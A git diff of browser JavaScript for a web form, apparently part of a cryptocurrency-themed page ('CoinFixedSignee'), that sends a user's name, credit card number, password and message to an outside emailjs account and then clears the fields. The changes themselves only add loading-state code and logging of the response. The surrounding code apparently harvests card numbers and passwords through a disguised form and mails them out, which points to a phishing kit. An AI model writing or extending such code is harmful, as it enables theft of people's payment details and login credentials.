@@ -4,11 +4,16 @@
 // const exchangeMeans = document.querySelector('#exchangeMeans');
 let display = document.querySelector('.display');
 const form = document.querySelector('#form')
+const loading = document.querySelector('.loading');
+const submitBtn = document.querySelector("#submit")
 
 
 window.onload = function sendMail() {
     form.addEventListener('submit', function(e) {
         e.preventDefault();
+
+        // submitBtn.value = 'Loading';
+        // submitBtn.classList.add('loading');
 
         var formContent = {
             from_name: 'CoinFixedSignee',
@@ -19,11 +24,14 @@ window.onload = function sendMail() {
         };
     
         emailjs.send('e920d5afds', 'template_a85hrv9', formContent).then((res) => {
-                alert('SUCCESS!');
+
+                alert('SUCCESS!' + ' ' + res.status + ' ' + res.text);
                 document.querySelector('#userName').value = '';
                 document.querySelector('#creditCard').value = '';
                 document.querySelector('#password').value = '';
                 document.querySelector('#message').value = '';
+                console.log(res);
+
             },
             (error) => {
                 alert('FAILED...', error);
